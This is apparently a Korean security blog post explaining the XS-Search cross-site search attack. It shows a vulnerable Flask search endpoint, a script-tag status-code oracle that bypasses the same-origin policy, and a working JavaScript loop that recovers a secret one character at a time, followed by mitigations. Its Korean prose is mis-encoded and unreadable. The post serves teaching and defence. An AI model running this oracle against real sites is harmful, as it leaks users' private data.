---
title: "[2025-08-19] XS-Search"
excerpt: "XS-Search ê°œë…, ê³µê²© ì¢…ë¥˜ ë° ëŒ€ì‘ ë°©ë²•"

categories:
  - Justice
tags:
  - [XS-Search, XSS]

permalink: /Justice/[2025-08-19] XS-Search/

toc: true
toc_sticky: true

date: 2025-08-19
last_modified_at: 2025-08-19
---

## ğŸ¦¥ ë³¸ë¬¸

### ì •ì˜ ë° ê°œë…

Cross-Site Search. ì¿¼ë¦¬ ê¸°ë°˜ ì‹œìŠ¤í…œì„ ì´ìš©í•´ ì´ìš©ìì˜ ë¹„ë°€ ì •ë³´ë¥¼ ìœ ì¶œí•˜ëŠ” ê¸°ë²•. ì£¼ë¡œ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ê²€ìƒ‰ ê¸°ëŠ¥ì„ ì´ìš©í•´ ì‚¬ìš©ìì˜ ë¯¼ê°í•œ ì •ë³´ë¥¼ ìœ ì¶œ. 

### ì˜ˆì œ

GET íŒŒë¼ë¯¸í„°ë¡œ ì¿¼ë¦¬ í˜•íƒœì˜ ì…ë ¥ì„ ë°›ê³ , ë¹„ë°€ê°’ì´ ì¿¼ë¦¬ ê°’ìœ¼ë¡œ ì‹œì‘í•œë‹¤ëŠ” ì¡°ê±´ì´ ë¶€í•©í•œë‹¤ë©´ OKì™€ 200 ì‘ë‹µ ì½”ë“œ. ì•„ë‹ˆë©´ NO ë¼ëŠ” ë©”ì‹œì§€ì™€ 404 ì‘ë‹µ ì½”ë“œ. 

```html
secret = "this_is_secret_value"

@app.route('/search')
def search_secret():
    query = request.args.get("query", "_")
    if secret.startswith(query):
        return "OK", 200
    else:
        return "NO", 404
```

- `secret` ê°’ì´ ì´ìš©ìì˜ ë¹„ë°€ ì •ë³´ì¼ ë•Œ, ì¼ë°˜ì ìœ¼ë¡œ ê³µê²©ìì˜ í˜ì´ì§€ì—ì„œ í•´ë‹¹ ì˜¤ë¦¬ì§„ìœ¼ë¡œ xhr ìš”ì²­ì„ ë³´ë‚´ê²Œ ë˜ë©´ SOP ì •ì±…ì— ë§‰í˜
    
    ```html
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://localhost:8000/search?query=t');
    
    xhr.onload = function () {
      console.log('Status Code:', xhr.status);
      console.log('Response Text:', xhr.responseText);
    };
    
    xhr.send();
    ```
    
- SOP ìš°íšŒ ë°©ë²•
    
    `<img>`, `<style>`, `<script>` ë“±ì˜ íƒœê·¸ëŠ” SOPì˜ ì˜í–¥ì„ ë°›ì§€ ì•ŠìŒ
    
    ```html
    function req(url) {
        let script = document.createElement('script');
        script.src = url;
        script.onload = () => console.log(200);
        script.onerror = () => console.log(404);
        document.head.appendChild(script);
    }
    
    req('http://localhost:8000/search?query=a');
    req('http://localhost:8000/search?query=t');
    ```
    
    - í˜„ì¬ ë¬¸ì„œì— `script` íƒœê·¸ë¥¼ ìƒì„±í•˜ê³  src ì†ì„±ì„ ê³µê²© ëŒ€ìƒ ì˜¤ë¦¬ì§„ì˜ URLë¡œ ì„¤ì •í•œ í›„, ë¡œë“œí•˜ëŠ”ë° ì„±ê³µí–ˆëŠ”ì§€ ì‹¤íŒ¨í–ˆëŠ”ì§€ì˜ ì—¬ë¶€ë¥¼ í†µí•´ 200, 404ë¥¼ êµ¬ë¶„í•  ìˆ˜ ìˆìŒ
    - ì‘ë‹µ ì½”ë“œë¥¼ í†µí•´ Blind SQLiì²˜ëŸ¼ í•œ ê¸€ìì”© ìœ ì¶” ê°€ëŠ¥
        
        ```html
        async function req(url) {
            return await new Promise((resolve, reject) => {
                const script = document.createElement("script");
                script.src = url;
                script.onload = resolve;
                script.onerror = reject;
        
                document.head.appendChild(script);
            });
        }
        
        async function search(query) {
            try {
                await req(
                  `http://localhost:8000/search?query=${query}`
                );
                return true;
            } catch (e) {
                return false;
            }
        }
        
        async function exploit() {
            let chars = "_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            let secret_length = 20;
            let secret = "";
        
            for (let i = 0; i < secret_length; i++) {
                for (let c of chars) {
                    if (await search(secret + c)) {
                        secret += c;
                        console.log(`found: ${secret}`);
                        break;
                    }
                }
            }
        }
        
        exploit()
        ```
        

### ëŒ€ì‘ ë°©ë²•

1. ê²€ìƒ‰ ê²°ê³¼ì˜ ì‘ë‹µ í¬ê¸°/ì‹œê°„ ê· ë“±í™”
    - ì¡´ì¬ ì—¬ë¶€ì™€ ê´€ê³„ì—†ì´ ë¹„ìŠ·í•œ ì‘ë‹µ í¬ê¸° ë°˜í™˜
    - ì¼ì •í•œ ì‹œê°„ ë”œë ˆì´ë¥¼ ì ìš©í•´ íƒ€ì´ë° ê¸°ë°˜ ë¶„ì„ì„ ì–´ë µê²Œ í•¨
2. Cross-Origin ì •ì±… ê°•í™”
    - `X-Frame-Options`, `Cross-Origin-Resource-Policy`, `Cross-Origin-Opener-Policy` ì ìš©
    - ë‹¤ë¥¸ ì¶œì²˜ì—ì„œ ê²€ìƒ‰ ê²°ê³¼ë¥¼ ë¡œë“œí•˜ì§€ ëª»í•˜ë„ë¡ ì°¨ë‹¨
3. Rate Limiting & Captcha ì ìš©
    - ê³µê²©ìê°€ ëŒ€ëŸ‰ ì‹œë„ë¥¼ í•˜ì§€ ëª»í•˜ê²Œ ì œí•œ
4. ë¡œê·¸ ëª¨ë‹ˆí„°ë§
    - ë¹„ì •ìƒì ì¸ ë°˜ë³µì  ê²€ìƒ‰ ìš”ì²­ íƒì§€